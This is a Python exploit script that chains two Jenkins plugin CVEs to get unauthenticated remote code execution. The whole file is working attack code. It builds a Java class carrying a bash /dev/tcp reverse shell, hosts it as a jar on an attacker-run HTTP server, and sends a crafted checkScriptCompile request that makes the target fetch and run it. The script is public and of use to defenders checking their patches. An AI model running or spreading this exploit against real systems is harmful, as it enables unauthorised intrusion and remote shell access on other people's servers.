#!/usr/bin/env python
#
# Exploit Title     : jenkins-preauth-rce-exploit.py
# Date              : 02/23/2019
# Authors           : wetw0rk & 0xtavian
# Vendor Homepage   : https://jenkins.oi
# Software Link     : https://jenkins.io/download/
# Tested on         : jenkins=v2.73 Plugins: Script Security=v1.49, Pipeline: Declarative=v1.3.4, Pipeline: Groovy=v2.60,
#
# Greetz: Hima, Fr13ndzSec, AbeSnowman, Berserk, Neil
#
# Description : This exploit chains CVE-2019-1003000 and CVE-2018-1999002 for Pre-Auth Remote Code Execution in Jenkins
# Security Advisory : https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266
#
# Vulnerable Plugins -
# Pipeline: Declarative Plugin up to and including 1.3.4
# Pipeline: Groovy Plugin up to and including 2.61
# Script Security Plugin up to and including 1.49
#
#
# Credit Goes To @orange_8361 & adamyordan
#
# http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
# http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
# https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc

import os
import sys
import requests
import random
import SimpleHTTPServer
import SocketServer
import multiprocessing

class exploit_ya_bish():

  def __init__(self, rhost, rport, lhost, lport):
    self.rhost = rhost
    self.rport = rport
    self.lhost = lhost
    self.lport = lport
    self.pname = ""

  # evil_server: server to host the payload
  def evil_server(self):
    handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer((self.lhost, 80), handler)
    httpd.serve_forever()
    return

  # gen_payload: generate payload and start web server
  def gen_payload(self):
    self.pname = ''.join(
      [
        random.choice(
          "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
          "abcdefghijklmnopqrstuvwxyz"
        ) for i in range(random.randint(1, 25))
      ]
    )

    home = os.getcwd()
    os.makedirs("www/package/%s/1/" % self.pname)
    os.chdir("www/package/%s/1/" % self.pname)

    pfile  = 'public class %s {\n' % self.pname
    pfile += '  public %s() {\n' % self.pname
    pfile += '    try {\n'
    pfile += '      String payload = "bash -i >& /dev/tcp/{:s}/{:s} 0>&1";\n'.format(self.lhost, self.lport)
    pfile += '      String[] cmds = { "/bin/bash", "-c", payload };\n'
    pfile += '      java.lang.Runtime.getRuntime().exec(cmds);\n'
    pfile += '    } catch (Exception e) {\n'
    pfile += '    }\n'
    pfile += '  }\n'
    pfile += '}\n'

    print "{1} generating payload"
    fd = open('{:s}.java'.format(self.pname), 'w')
    fd.write(pfile)
    fd.close()

    os.makedirs("META-INF/services/")
    os.system("echo %s >  META-INF/services/org.codehaus.groovy.plugins.Runners" % self.pname)
    os.system("javac -Xlint:-options -source 6 -target 1.6 %s.java" % self.pname)
    os.system("jar cf %s-1.jar ." % self.pname)

    print "{2} starting evil payload server"
    os.chdir("%s/www" % home)
    jobs = []
    for i in range(1):
      p = multiprocessing.Process(target=self.evil_server)
      jobs.append(p)
      p.start()

    os.chdir(home)

    return

  def exploit(self):
    self.gen_payload()

    cookies = \
    {
      'JSESSIONID.wetw0rk!': 'XXXXXXXXXXXXXXXXXXXXXXXX',
    }

    headers = \
    {
      'Host': '{:s}:{:s}'.format(self.rhost, self.rport),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate',
      'Connection': 'close',
      'Upgrade-Insecure-Requests': '1',
    }

    print "{3} as easy as 1,2,3 triggering now"
    response = requests.get(
      (
       'http://{:s}:{:s}/securityRealm/user/admin/descriptorByName/'
       'org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value='
          '@GrabConfig(disableChecksums=true)%0a'
          '@GrabResolver(name=%27{:s}%27,%20root=%27http://{:s}%27)%0a'
          '@Grab(group=%27package%27,%20module=%27{:s}%27,%20version=%271%27)%0aimport%20Payload;'.format(
            self.rhost, self.rport,
            self.pname,
            self.lhost,
            self.pname
        )
      ),
      headers=headers,
      cookies=cookies,
      verify=False
    )

    return

def main():
  try:
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
  except:
    print "Usage: ./%s <rhost> <rport> <lhost> <lport>" % sys.argv[0]
    print "MAKE SURE U GOT A LISTENER HOMIE!!"
    exit(-1)

  start = exploit_ya_bish(rhost,rport,lhost,lport)
  start.exploit()
  os.system("rm -r www")

main()